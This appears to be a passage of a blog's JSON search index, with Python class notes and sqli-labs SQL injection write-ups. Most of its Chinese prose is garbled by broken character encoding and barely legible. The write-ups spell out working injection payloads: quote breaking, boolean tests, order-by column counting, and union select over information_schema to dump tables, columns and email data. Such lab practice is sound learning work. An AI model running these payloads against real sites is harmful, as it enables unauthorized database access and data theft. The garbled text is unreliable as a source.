","text":"pythonâ€”â€”ç±»é¢å‘å¯¹è±¡ç¼–ç¨‹éœ€è¦ä½¿ç”¨ç±»ï¼Œç±»å’Œå®ä¾‹æ¯æ¯ç›¸å…³ï¼Œæœ‰äº†ç±»ä¹‹åæˆ‘ä»¬å¿…é¡»åˆ›å»ºä¸€ä¸ªå®ä¾‹ï¼Œè¿™æ ·æ‰èƒ½è°ƒç”¨ç±»çš„æ–¹æ³•ï¼š 12class&lt;ç±»å&gt;: &lt;è¯­å¥&gt; ç±»ç§æœ‰å±æ€§ï¼š_private_attrsä¸¤ä¸ªä¸‹åˆ’çº¿å¼€å¤´ï¼Œå£°æ˜è¯¥å±æ€§ä¸ºç§æœ‰ï¼Œä¸èƒ½å†ç±»çš„å¤–éƒ¨è¢«ä½¿ç”¨æˆ–ç›´æ¥è®¿é—®ï¼Œåœ¨ç±»çš„å†…éƒ¨çš„æ–¹æ³•ä¸­ä½¿ç”¨self._private_attrs ç±»çš„æ–¹æ³•:åœ¨ç±»çš„å†…éƒ¨ï¼Œä½¿ç”¨defå…³é”®å­—å¯ä»¥ä¸ºç±»å®šä¹‰ä¸ªä¸€ä¸ªæ–¹æ³•ï¼Œä¸ä¸€èˆ¬å‡½æ•°å®šä¹‰ä¸åŒï¼Œç±»æ–¹æ³•å¿…é¡»åŒ…å«å‚æ•°selfï¼Œä¸”ä¸ºç¬¬ä¸€ä¸ªå‚æ•° ç±»çš„ä¸“æœ‰æ–¹æ³•1234567891011121314__init__ æ„é€ å‡½æ•°ï¼Œåœ¨ç”Ÿæˆå¯¹è±¡æ—¶è°ƒç”¨__del__ ææ„å‡½æ•°ï¼Œé‡Šæ”¾å¯¹è±¡æ—¶ä½¿ç”¨__repr__ æ‰“å°ï¼Œè½¬æ¢__setitem__ æŒ‰ç…§ç´¢å¼•èµ‹å€¼__getitem__ æŒ‰ç…§ç´¢å¼•è·å–å€¼__len__ è·å¾—é•¿åº¦__cmp__ æ¯”è¾ƒè¿ç®—__call__ å‡½æ•°è°ƒç”¨__add__ åŠ è¿ç®—__sub__ å‡è¿ç®—__mul__ ä¹˜è¿ç®—__div__ é™¤è¿ç®—__mod__ æ±‚ä½™è¿ç®—__pow__ ç§°æ–¹ å‚è€ƒ:https://blog.csdn.net/brucewong0516/article/details/79114977 classçš„å±æ€§ä¾‹ï¼š 1234567891011class person(): tall = 180 def __init__(self,name,age,weight): self.name = name self.age = age self.weight = weight def infoma(self): print('%s is %s weights %s'%(self.name,self.age,self.__weight))person = person('bruce',25,60)infoma = person.infoma() æ•°æ®å±æ€§æ•°æ®å±æ€§åˆ†ä¸ºç±»æ•°æ®å±æ€§å’Œå®ä¾‹æ•°æ®å±æ€§ ç±»æ•°æ®å±æ€§ï¼šå°±æ˜¯ä¸Šé¢çš„tallï¼Œå¯ä»¥è¢«æ·»åŠ  123456789101112131415class person(object): tall = 180 hobbies = [] def __init__(self, name, age,weight): self.name = name self.age = age self.weight = weight def infoma(self): print('%s is %s weights %s'%(self.name,self.age,self.weight))person.hobbies.extend([&quot;football&quot;, &quot;woman&quot;]) #ç±»æ•°æ®å±æ€§å±äºç±»æœ¬èº«ï¼Œå¯ä»¥é€šè¿‡ç±»åè¿›è¡Œè®¿é—®/ä¿®æ”¹ï¼Œæ­¤å¤„æ·»åŠ &quot;football&quot;ã€&quot;woman&quot;ä¸¤ä¸ªprint(&quot;person hobbies list: %s&quot; %person.hobbies ) # class can add class attribute after class definationperson.hobbies2 = [&quot;reading&quot;, &quot;jogging&quot;, &quot;swimming&quot;] #åœ¨ç±»å®šä¹‰ä¹‹åï¼Œå¯ä»¥é€šè¿‡ç±»ååŠ¨æ€æ·»åŠ ç±»æ•°æ®å±æ€§ï¼Œæ–°å¢çš„ç±»å±æ€§ä¹Ÿè¢«ç±»å’Œæ‰€æœ‰å®ä¾‹å…±æœ‰print( &quot;person hobbies2 list: %s&quot; %person.hobbies2 ) print( dir(person)) ç‰¹æ®Šçš„ç±»å±æ€§ï¼šå¯¹äºæ‰€æœ‰çš„ç±»ï¼Œéƒ½æœ‰ä¸€ç»„ç‰¹æ®Šçš„å±æ€§ _ _ name_ _ï¼šç±»çš„åå­—ï¼ˆå­—ç¬¦ä¸²ï¼‰_ _ doc _ _ ï¼šç±»çš„æ–‡æ¡£å­—ç¬¦ä¸²_ _ bases _ _ï¼šç±»çš„æ‰€æœ‰çˆ¶ç±»ç»„æˆçš„å…ƒç»„_ _ dict _ _ï¼šç±»çš„å±æ€§ç»„æˆçš„å­—å…¸_ _ module _ _ï¼šç±»æ‰€å±çš„æ¨¡å—_ _ class _ _ï¼šç±»å¯¹è±¡çš„ç±»å‹ å®ä¾‹æ•°æ®å±æ€§ï¼šä¾‹å¦‚nameï¼Œåªèƒ½é€šè¿‡å®ä¾‹è®¿é—® 1234567891011Bruce = person(&quot;Bruce&quot;, 25,60) #å®ä¾‹æ•°æ®å±æ€§åªèƒ½é€šè¿‡å®ä¾‹è®¿é—®print (&quot;%s is %d years old&quot; %(Bruce.name, Bruce.age) )# class instance can add new attribute # &quot;gender&quot; is the instance attribute only belongs to wilberBruce.gender = &quot;male&quot; #åœ¨å®ä¾‹ç”Ÿæˆåï¼Œè¿˜å¯ä»¥åŠ¨æ€æ·»åŠ å®ä¾‹æ•°æ®å±æ€§ï¼Œä½†æ˜¯è¿™äº›å®ä¾‹æ•°æ®å±æ€§åªå±äºè¯¥å®ä¾‹print( &quot;%s is %s&quot; %(Bruce.name, Bruce.gender) ) # class instance can access class attributeprint( dir(Bruce))Bruce.hobbies.append(&quot;C#&quot;)print (Bruce.hobbies) å¯¹äºç±»æ•°æ®å±æ€§å’Œå®ä¾‹æ•°æ®å±æ€§ï¼Œå¯ä»¥æ€»ç»“ä¸ºï¼š 1.ç±»æ•°æ®å±æ€§å±äºç±»æœ¬èº«ï¼Œå¯ä»¥é€šè¿‡ç±»åè¿›è¡Œè®¿é—®/ä¿®æ”¹2.ç±»æ•°æ®å±æ€§ä¹Ÿå¯ä»¥è¢«ç±»çš„æ‰€æœ‰å®ä¾‹è®¿é—®/ä¿®æ”¹3åœ¨ç±»å®šä¹‰ä¹‹åï¼Œå¯ä»¥é€šè¿‡ç±»ååŠ¨æ€æ·»åŠ ç±»æ•°æ®å±æ€§ï¼Œæ–°å¢çš„ç±»å±æ€§ä¹Ÿè¢«ç±»å’Œæ‰€æœ‰å®ä¾‹å…±æœ‰4å®ä¾‹æ•°æ®å±æ€§åªèƒ½é€šè¿‡å®ä¾‹è®¿é—®5åœ¨å®ä¾‹ç”Ÿæˆåï¼Œè¿˜å¯ä»¥åŠ¨æ€æ·»åŠ å®ä¾‹æ•°æ®å±æ€§ï¼Œä½†æ˜¯è¿™äº›å®ä¾‹æ•°æ®å±æ€§åªå±äºè¯¥å®ä¾‹ å°ç»“è¿™é‡Œä¸»è¦çŸ¥é“ä»€ä¹ˆæ˜¯ç±»æ•°æ®ä»€ä¹ˆæ˜¯å®ä¾‹æ•°æ®ï¼ŒåŠ æ·±å¯¹ç±»è¿™ä¸€ä¸ªæ¦‚å¿µçš„ç†è§£ å‚è€ƒï¼šhttps://blog.csdn.net/brucewong0516/article/details/79118703 classçš„è®¿é—®æ§åˆ¶1ã€å•ä¸‹åˆ’çº¿â€_â€åœ¨Pythonä¸­ï¼Œé€šè¿‡å•ä¸‹åˆ’çº¿â€â€œæ¥å®ç°æ¨¡å—çº§åˆ«çš„ç§æœ‰åŒ–ï¼Œå˜é‡é™¤å¤–ã€‚ä¸€èˆ¬çº¦å®šä»¥å•ä¸‹åˆ’çº¿â€â€å¼€å¤´çš„å‡½æ•°ä¸ºæ¨¡å—ç§æœ‰çš„ï¼Œä¹Ÿå°±æ˜¯è¯´â€from moduleName import * â€œå°†ä¸ä¼šå¼•å…¥ä»¥å•ä¸‹åˆ’çº¿â€_â€å¼€å¤´çš„å‡½æ•°ã€‚ç°åœ¨æœ‰ä¸€ä¸ªæ¨¡å— example_example.pyï¼Œå†…å®¹ç”¨å¦‚ä¸‹ï¼Œæ¨¡å—ä¸­ä¸€ä¸ªå˜é‡åå’Œä¸€ä¸ªå‡½æ•°ååˆ†åˆ«ä»¥â€_â€œå¼€å¤´ï¼š 2ã€åŒä¸‹åˆ’çº¿â€__â€1.å¯¹äºPythonä¸­çš„ç±»å±æ€§ï¼Œå¯ä»¥é€šè¿‡åŒä¸‹åˆ’çº¿â€__â€œæ¥å®ç°ä¸€å®šç¨‹åº¦çš„ç§æœ‰åŒ–ï¼Œå› ä¸ºåŒä¸‹åˆ’çº¿å¼€å¤´çš„å±æ€§åœ¨è¿è¡Œæ—¶ä¼šè¢«â€æ··æ·†â€ï¼ˆmanglingï¼‰ã€‚ 2.åŒä¸‹åˆ’çº¿çš„å¦ä¸€ä¸ªé‡è¦çš„ç›®åœ°æ˜¯ï¼Œé¿å…å­ç±»å¯¹çˆ¶ç±»åŒåå±æ€§çš„å†²çª åæ§½:å­¦çš„å¾ˆæ— è¯­ï¼Œå› ä¸ºçœ‹çš„ä¸æ˜¯å¾ˆæ‡‚ï¼Œæ„Ÿè§‰æ‡µæ‡µçš„== https://blog.csdn.net/brucewong0516/article/details/79121179","link":"/2021/02/27/python%E7%B1%BB%E7%9B%B8%E5%85%B3%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/"},{"title":"solidityæ™ºèƒ½åˆçº¦å­¦ä¹ ","text":"","link":"/2021/05/01/solidity%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AD%A6%E4%B9%A0/"},{"title":"sqli-labså°è¯•","text":"è¿™ä¸ªæ˜¯ç¬¬äºŒæ¬¡å†™è¿™ç¯‡åšå®¢ï¼Œæˆ‘æ²¡æƒ³åˆ°å±…ç„¶å¿˜è®°ä¿å­˜äº†ï¼Œæ³ªç›®ã€‚ã€‚ sqlæ³¨å…¥é¦–å…ˆæˆ‘è§‰å¾—å¯èƒ½è¦å…ˆç†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯sqlæ³¨å…¥sqlæ³¨å…¥ æŒ‡çš„æ˜¯ï¼Œwebåº”ç”¨ç¨‹åºå¯¹ç”¨æˆ·è¾“å…¥æ•°æ®çš„åˆæ³•æ€§æ²¡æœ‰åˆ¤æ–­æˆ–è¿‡æ»¤ä¸ä¸¥ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨webåº”ç”¨ç¨‹åºäº‹å…ˆå®šä¹‰å¥½çš„æŸ¥è¯¢è¯­å¥çš„ç»“å°¾æ·»åŠ é¢å¤–çš„SQLè¯­å¥ï¼Œåœ¨ç®¡ç†å‘˜ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹äº‹å…ˆéæ³•æ“ä½œï¼Œä»¥æ­¤å®ç°æ¬ºéª—æ•°æ®åº“æœåŠ¡å™¨æ‰§è¡Œéæˆæƒçš„å‘½ä»¤ã€‚ sqlæ³¨å…¥çš„ç±»å‹1.å­—ç¬¦å‹æ³¨å…¥2.æ•°å­—å‹æ³¨å…¥ è¿™æ˜¯ä¸€ä¸ªå†™åˆ°ç¬¬ä¸‰å…³çš„è¡¥å……æˆ‘åœ¨æƒ³ä¸ºä»€ä¹ˆåŠ å…¥ä¸€ä¸ªå•å¼•å·æˆ–è€…â€˜ï¼‰å°±å¯ä»¥å®ç°æ³¨å…¥ï¼Œå°±å¯ä»¥è¿›è¡Œæ“ä½œï¼Œåœ¨æ€è€ƒä¸€ç•ªè¿‡åï¼Œæˆ‘å‘ç°æ˜¯è¿™æ ·çš„ï¼šå°±æ‹¿ç¬¬ä¸€å…³æ¥è¯´å§ å½“æˆ‘è¾“å…¥çš„æ˜¯?id=1â€™çš„æ—¶å€™ï¼Œçœ‹è¿™ä¸ªé”™è¯¯ä»£ç ï¼š 12 use near ''1'' LIMIT 0,1' at line 1SELECT * FROM users WHERE id='1'' LIMIT 0,1//è¿™ä¸ªæ˜¯æˆ‘åœ¨æ–‡ä»¶é‡Œé¢åŠ å…¥çš„æç¤ºsqlæ‰§è¡Œçš„è¯­å¥ å½“æˆ‘è¾“å…¥and1=1å å¯ä»¥å‘ç°ä»–çš„é”™è¯¯æç¤ºæ˜¯ 12 use near 'and1=1' LIMIT 0,1' at line 1SELECT * FROM users WHERE id='1'and1=1' LIMIT 0,1 è¿™é‡Œæ˜¯æ¥è‡ªç¬¬23å…³çš„ä¸€ä¸ªæ›´æ­£1æ‰€ä»¥å°±åˆé‡æ–°æ€è€ƒäº†ä¸€ä¸‹ï¼ŒåŠ ä¸Šèµ„æ–™æŸ¥æ‰¾ï¼šé—­åˆæŒ‡çš„æ˜¯åŒå¼•å·æˆå¯¹å­˜åœ¨ï¼Œæ‰€ä»¥æˆ‘ä»¬çœ‹ä¸Šé¢çš„è¯­å¥ å½“æˆ‘ä»¬åŠ å…¥äº†ä¸€ä¸ªå¼•å·çš„æ—¶å€™ï¼Œæ­¤æ—¶çš„å¼•å·ä¸€å…±æ˜¯æœ‰äº”ä¸ªçš„ï¼Œæ‰€ä»¥å¿…ç„¶å­˜åœ¨ä¸€ä¸ªå¤šä½™çš„å•å¼•å·ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦å»æ‰å“ªä¸ªå¼•å·æ‰ä¸ä¼šå½±å“æˆ‘ä»¬çš„è¯­å¥å‘¢ï¼Ÿ **2.**æ³¨é‡Šç¬¦ ä¼šå°†åé¢æ‰€æœ‰å†…å®¹ç»™æ³¨é‡Šæ‰ ,,,æ‰€ä»¥åœ¨è¿™ä¸ªè¯­å¥ä¸­â€™â€™2â€™and1=1â€™ LIMIT 0,1â€™ï¼Œæˆ‘ä»¬å…ˆè§£æä¸€ä¸‹ï¼Œ é¦–å°¾å„æœ‰ä¸€ä¸ªå¼•å·ï¼Œåˆ‡2å‰é¢å’Œ1åé¢å„æœ‰ä¸€ä¸ªå¼•å·ï¼Œè¿™ä¸ªæ˜¯â€™$idâ€™ åœ¨æºç ä¸­å‡ºç°çš„ä¸¤ä¸ªå¼•å·ï¼Œè€Œé¦–å°¾çš„å¼•å·æ˜¯åæ¥å‡ºç°çš„ï¼Œæˆ‘ä»¬åœ¨2åå¤šåŠ äº†ä¸€ä¸ªå•å¼•å·åï¼Œå¯¼è‡´å¼•å·ä¹‹é—´ä¸é…å¯¹äº†ï¼Œæ‰€ä»¥å‡ºç°é”™è¯¯ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬éœ€è¦å°†1åé¢çš„å•å¼•å·ï¼Œlimitï¼Œè¿™æ ·2å‰é¢çš„å•å¼•å·å°±å’Œæˆ‘ä»¬çš„æ’å…¥çš„ä½†å¼•å·é…å¯¹æˆåŠŸäº†é‚£ä¹ˆå½“ç„¶ä¹Ÿæœ‰ä¸æ³¨é‡Šçš„æ–¹æ³•ï¼šå°±æ˜¯è®©æ‰€æœ‰çš„å¼•å·éƒ½æ‰¾åˆ°è‡ªå·±çš„å¦ä¸€åŠï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åœ¨è¿™é‡Œå¤šåŠ ä¸€ä¸ªå•å¼•å·å°±å¯ä»¥äº†**1.**è¿™è¾¹æœ‰å‡ ä¸ªé—®é¢˜éœ€è¦è¯´ä¸€ä¸‹ï¼Œå¼•å·å†…çš„æ•°æ®è¦åˆæ³•ï¼Œè¦ä¿è¯è¿è´¯æ€§ï¼Œä»–å‰åæ˜¯å¯ä»¥äº’ç›¸æ‹¼æ¥çš„æ¯”å¦‚â€™=1â€™å°±ä¸è¡Œï¼Œè¿˜æœ‰å°±æ˜¯å¼•å·çš„é—­åˆå¥½åƒæ˜¯æœ‰å°±è¿‘åŸåˆ™ï¼Œæˆ‘åˆšæ‰è¯•äº†ä¸€ä¸‹ å‘ç° â€˜1â€™and 1=1â€™â€™è¿™ä¸ªå°±ä¸è¡Œï¼Œå¯èƒ½æ˜¯å› ä¸º æœ€åä¸¤ä¸ªå¼•å·ç›´æ¥æ— æ•°æ®å¯¼è‡´å‡ºé”™äº†ï¼Œç„¶åä¸¤ä¸ªå¼•å·ä¹‹é—´é—­åˆï¼Œå¼•å·çš„å†…å®¹ä¼šå˜æˆå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±æ— æ³•ä½¿ç”¨order by æ¥æŸ¥è¯¢å­—ç¬¦æ®µæ•°ç›®ã€‚å› ä¸ºorder byéœ€è¦çš„æ˜¯æ•°å­—ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬ç›´æ¥ä½¿ç”¨ union selectå°è¯•å³å¯ã€‚ è¿™æ˜¯æ¥è‡ªåé¢çš„å¤ä¹ ï¼Œå¦‚æœè¦å‚è€ƒçš„çœ‹è¿™ä¸ªå°±å¤Ÿäº†å…³äºå•å¼•å·ï¼Œæˆ‘ä»¬çŸ¥é“ æˆ‘ä»¬è¾“å…¥1â€™ä»£å…¥åˆ°selectæŸ¥è¯¢è¯­å¥æ˜¯è¿™æ ·çš„ï¼š SELECT * FROM users WHERE id=â€™1â€™â€™ LIMIT 0,1æ³¨æ„åˆ°1åé¢å¤šäº†ä¸€ä¸ªâ€™ï¼Œæ­¤æ—¶ æ˜¯ä¸ç¬¦åˆè¯­æ³•çš„ï¼Œå› ä¸ºæœ‰ä¸ªå•å¼•å·è½ç©ºäº†ã€‚æ‰€ä»¥è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±æœ‰ä¸¤ä¸ªæ–¹æ¡ˆ1.æ³¨é‡Šæ‰åé¢çš„å•å¼•å· è¿™é‡Œä»¥#ä½œä¸ºæ¼”ç¤ºï¼šSELECT * FROM users WHERE id=â€™1â€™#â€™ LIMIT 0,1æ­¤æ—¶è¿™ä¸ªè¯­å¥åœ¨mysqlé‡Œé¢æ˜¯è¿™æ ·SELECT * FROM users WHERE id=â€™1â€™#å»æ‰§è¡Œçš„ï¼Œå› ä¸ºåé¢éƒ½è¢«æ³¨é‡Šæ‰äº†ï¼Œè¿™ä¸ªæ—¶å€™å°±ç¬¦åˆè¯­æ³•ï¼Œåé¢å¯ä»¥åŠ å…¥å…¶å®ƒè¯­å¥äº†å†ä¸¾ä¸ªä¾‹å­ï¼Œä»¥unionè”åˆæ³¨å…¥ä¸ºä¾‹:SELECT * FROM users WHERE id=â€™1â€™union select database()#â€™ LIMIT 0,1 ä»£å…¥åˆ°mysqlæ˜¯è¿™æ ·çš„:SELECT * FROM users WHERE id=â€™1â€™union select database()# 2.é—­åˆåé¢å•å¼•å·SELECT * FROM users WHERE id=â€™1â€™or1=1â€™1â€™ LIMIT 0,1 è¿™ä¸ªè¯­å¥ä¹Ÿæ˜¯ç¬¦åˆè¯­æ³•çš„ ä»£å…¥åˆ°mysqlæ˜¯è¿™æ ·çš„:SELECT * FROM users WHERE id=â€™1â€™(æŸ¥è¯¢id=1) or 1=1(è¿™æ˜¯æ‰§è¡Œäº†ä¸€ä¸ªæ°¸æ’ä¸ºçœŸçš„æˆ–è¯­å¥) â€˜1â€™(è¾“å…¥äº†ä¸€ä¸ª1) LIMIT 0,1 less11.æ ¹æ®è¿™ä¸ªé¢˜ç›®ä¸­çš„get-error based-single quotesï¼Œæˆ‘ä»¬å°±å¯ä»¥çŸ¥é“è¿™é¢˜æ˜¯å•å¼•å·å¼•èµ·çš„å­—ç¬¦å‹è¾“å…¥ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥è¾“å…¥?id=1ã€‚2.æ¥ä¸‹æ¥æˆ‘ä»¬è¾“å…¥ä¸€ä¸ªå•å¼•å·â€™3.å¯ä»¥å‘ç°ï¼Œç½‘é¡µå¼€å§‹æŠ¥é”™äº†å†…å®¹æ˜¯ You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near â€˜â€™1â€™â€™ LIMIT 0,1â€™ at line 1SELECT * FROM users WHERE id=â€™1â€™â€™ LIMIT 0,1 åœ¨è¿™ä¸ªå½“ä¸­å•å¼•å·è¢«åŒ…æ‹¬è¿›å»äº†ï¼Œä½†æ˜¯å´æŠ¥é”™äº†ï¼Œè€Œå½“æˆ‘å°è¯•å…¶ä»–ç¬¦å·çš„æ—¶å€™ï¼Œå‘ç°æ˜¯å¯ä»¥æ­£å¸¸æ˜¾ç¤ºçš„ã€‚æ¥ç€æˆ‘ä»¬ç”¨and 1=1 å’Œand1=2æ¥æµ‹è¯•ï¼Œ è¿™é‡Œè¡¥å……ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼Œ and 1=1ä»£è¡¨æ°¸æ’ä¸ºçœŸï¼Œ and 1=2 ä»£è¡¨æ°¸æ’ä¸ºå‡ æˆ‘ä»¬åˆ¤æ–­æœ‰æ²¡æœ‰æ³¨å…¥çš„æ—¶å€™å¯ä»¥åˆ©ç”¨è¿™ç‚¹æ¥åˆ¤æ–­ï¼Œå¦‚æœé¡µé¢ä¸ä¸€æ ·ï¼Œå°±ä»£è¡¨æˆ‘ä»¬çš„è¯­å¥ç”Ÿæ•ˆäº†ï¼Œå­˜åœ¨æ³¨å…¥ç‚¹! æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦çŸ¥é“æŸ¥è¯¢è¡¨çš„å­—æ®µæ•°ï¼Œæˆ‘ä»¬æ‰èƒ½åˆ©ç”¨union+selectæŸ¥è¯¢æˆ‘ä»¬æ‰€éœ€è¦çš„ä¿¡æ¯å› ä¸º select ï¼ˆï¼‰ï¼Œï¼ˆï¼‰ï¼Œï¼ˆï¼‰ï¼Œ æœ‰å‡ ä¸ªæ‹¬å·æ˜¯è¦å’Œè¯¥è¡¨çš„å­—æ®µæ•°æ‰€å¯¹åº”ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬éœ€è¦å¼•å…¥ä¸€ä¸ªorder byå‘½ä»¤åœ¨è¿™é‡Œ order by çš„ä½œç”¨æ˜¯ç”¨æ¥æŸ¥è¯¢å­—æ®µæ•°ï¼Œå½“ä½ order by ï¼ˆä¸€ä¸ªæ•°å­—ï¼‰çš„æ—¶å€™ï¼Œå¦‚æœæœ‰è¿™ä¹ˆå¤šå­—æ®µæ•°ï¼Œé‚£ä¹ˆè¾“å‡ºç»“æœå°±ä¸ä¼šæŠ¥é”™ï¼Œå¦‚æœæ²¡æœ‰ï¼Œå°±ä¼šæŠ¥é”™è€Œæˆ‘ä»¬é€šå¸¸ä¼šå°†order by ç»“åˆäºŒåˆ†æ³•è¿™ä¸ªæ—¶å€™å°±å¯ä»¥å¾ˆå¿«çš„æŸ¥è¯¢åˆ°å­—æ®µæ•°ï¼ˆæ ¸å¿ƒæ˜¯çŒœï¼‰ çŸ¥é“å­—æ®µæ•°å¼ï¼Œå¹¶ä¸”çŸ¥é“æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨æ³¨å…¥ç‚¹ï¼Œæ·»åŠ ä¸€äº›å‘½ä»¤è¯­å¥ï¼Œè·å¾—æˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯ã€‚ ç„¶åè¿™é‡Œéœ€è¦äº†è§£ä¸€ä¸ªunionå‘½ä»¤ ï¼š ä¸¤ä¸ªè¦è”åˆçš„SQLè¯­å¥ å­—æ®µä¸ªæ•°å¿…é¡»ä¸€æ ·ï¼Œè€Œä¸”å­—æ®µç±»å‹è¦ä¸€è‡´ è¿™ä¸ªunionå‘½ä»¤å¯ä»¥æ‹¼æ¥è¯­å¥ï¼Œä½¿å¾—å°†ä¸¤ä¸ªselectè¯­å¥è”åˆèµ·æ¥ä½¿ç”¨ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥è®©å‰é¢é‚£ä¸ªselectä¸ºå‡ä½¿ç”¨ä¸äº†ï¼Œè¿™æ ·åé¢çš„è¯­å¥å°±å¯ä»¥ä½¿ç”¨äº†ã€‚ è¿™ä¸ªæ—¶å€™ä½¿ç”¨ ?id=1â€™ and 0 union select 1,2,3 â€“+ å°±å¯ä»¥å‘ç°é¡µé¢å˜æˆ è¿™ä¸ªæ ·å­ï¼Œè¯´æ˜å­—æ®µ2ä»£è¡¨çš„æ˜¯ç™»å½•åä¸€æ ï¼Œå­—æ®µ3ä»£è¡¨çš„æ˜¯å¯†ç ä¸€æ  æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬è¦åšçš„å°±æ˜¯è®©å¯ä»¥æ˜¾ç¤ºçš„è¿™å‡ æ æˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯ï¼š å½“æˆ‘ä»¬è¾“å…¥select 1,database (),3 â€“+çš„æ—¶å€™ æˆ‘ä»¬å°±å¯ä»¥å¾—çŸ¥å…¶ä¸­æ•°æ®åº“çš„åå­—ï¼Œä¸ºsecurity ç´§æ¥ç€ï¼Œæˆ‘ä»¬å°±å¯ä»¥å†åˆ©ç”¨select æŸ¥è¯¢è¿™ä¸ªåº“åé‡Œé¢çš„è¡¨åæ¥ä¸‹æ¥æˆ‘ä»¬åœ¨unionåé¢æ·»åŠ  select 1,group_concat(table_name),3 from information _schema.tables where table_schema =â€™securityâ€™ â€“+ é‚£è¿™ä¸ªæ—¶å€™ å°±å‡ºç°äº†è¿™ä¸ªæ•°æ®åº“ä¸­çš„æ‰€æœ‰è¡¨åï¼Œ æ¥ä¸‹æ¥æˆ‘ä»¬çŸ¥é“äº†åº“åï¼ŒçŸ¥é“äº†è¡¨åï¼Œå°±å¯ä»¥å»æ‰¾è¡¨ä¸­çš„å­—æ®µåäº†å·®æ‰¾å­—æ®µåçš„è¯­å¥æ˜¯è¿™æ ·çš„ select 1,group_concat(column_name),3 from information_schema.columns where table_schema=â€™securityâ€™ and table_name=â€™emailsâ€™â€“+ä¹Ÿå¯ä»¥ç›´æ¥æ˜¯ select 1,group_concat(column_name),3 from information_schema.columns where table_name=â€™emailsâ€™â€“+ æ ¹æ®è¿™æ®µè¯­å¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥è·å¾—emalisè¿™ä¸ªè¡¨ä¸­çš„å­—æ®µå å«æœ‰ä¸€ä¸ªid ä¸€ä¸ªemail_id è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±çˆ†ä¸€ä¸‹å­—æ®µå è¿™ä¸ªæ—¶å€™æˆ‘ä»¬ä½¿ç”¨ select 1,email_id,3 from emails â€“+ å°±å¯ä»¥çŸ¥é“è¿™ä¸ªå­—æ®µåä¸‹çš„æ•°æ® è¿™æ ·å°±å¤§åŠŸå‘Šæˆäº† è¿™ä¸ªæ—¶å€™è¡¥å……ä¸€äº›çŸ¥è¯†ï¼šmysql5.0ç‰ˆæœ¬ä¹‹å ä¼šåœ¨æ•°æ®åº“ä¸­å­˜æ”¾ä¸€ä¸ªinformation_schemaçš„æ•°æ®åº“ï¼Œåœ¨è¯¥åº“ï¼Œæˆ‘ä»¬éœ€è¦è®°ä½ä¸‰ä¸ªè¡¨åï¼Œåˆ†åˆ«æ˜¯schemataï¼Œtablesï¼Œcolums åœ¨schemataè¡¨ä¸­å­˜å‚¨è¯¥ç”¨æˆ·åˆ›å»ºçš„æ‰€æœ‰æ•°æ®åº“çš„åº“åï¼Œåœ¨è¯¥è¡¨ä¸­ è®°å½•æ•°æ®åº“åº“åçš„å­—æ®µåä¸ºï¼šschema_name tablesä¸­å­˜å‚¨è¯¥ç”¨æˆ·åˆ›å»ºçš„æ‰€æœ‰æ•°æ®çš„åº“åå’Œè¡¨åï¼Œåœ¨è¿™ä¸ªè¡¨ä¸­è®°å½•æ•°æ®åº“åº“åå’Œè¡¨åçš„å­—æ®µååˆ†åˆ«ä¸º table_schemaå’Œtable_name columnsè¡¨å­˜å‚¨è¯¥ç”¨æˆ·åˆ›å»ºçš„æ‰€æœ‰æ•°æ®åº“çš„åº“åï¼Œè¡¨åå’Œå­—æ®µåï¼Œåœ¨è¯¥è¡¨ä¸­è®°å½•æ•°æ®åº“åº“åï¼Œè¡¨åå’Œå­—æ®µåçš„å­—æ®µåä¸ºtable_schema,table_name,column_name; group_concatï¼ˆï¼‰å‡½æ•°åŠŸèƒ½ï¼šå°†group byäº§ç”Ÿçš„åŒä¸€ä¸ªåˆ†ç»„ä¸­çš„å€¼è¿æ¥èµ·æ¥ï¼Œè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ç»“æœã€‚ åœ¨æˆ‘ä»¬è¿™é¢˜ä¸­æˆ‘ä»¬æ˜¯ç”¨group_concat(column_name)æ„æ€æ˜¯å°†è¿™ä¸ªè¡¨ä¸­æ‰€æœ‰å­—æ®µåè¿æ¥èµ·æ¥å¹¶è¿”å›æ•°æ®ã€‚https://www.cnblogs.com/wang-yaz/p/10862627.htmlè¿™ä¸ªæ˜¯å‚è€ƒé“¾æ¥","link":"/2020/10/24/sqli-labs%E5%B0%8F%E8%AF%95/"},{"title":"sqlilabs 3","text":"LESS-7 åœ¨è¿™é¢˜å½“ä¸­ï¼Œæˆ‘ä»¬ä¸éš¾å‘ç°ï¼Œè¿™æ¬¡ä»–æ˜¯å¯¹((â€˜$idâ€™))åšäº†è¿™ä¸ªå¤„ç†ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦åœ¨åé¢å¤šåŠ ä¸€ä¸ªâ€™))è¿™ä¸ª ç„¶ååœ¨é‡Œé¢æ·»åŠ æˆ‘ä»¬éœ€è¦æ³¨å…¥çš„è¯­å¥å°±å¯ä»¥è¿›è¡Œæ³¨å…¥äº† å¥½äº† æˆåŠŸæ‰§è¡Œï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬è¾“å…¥æˆ‘ä»¬çš„æŸ¥è¯¢è¯­å¥è¯•è¯• å› ä¸ºä¹‹å‰éƒ½çŸ¥é“ä»–çš„æ•°æ®åº“åå­—æ˜¯security 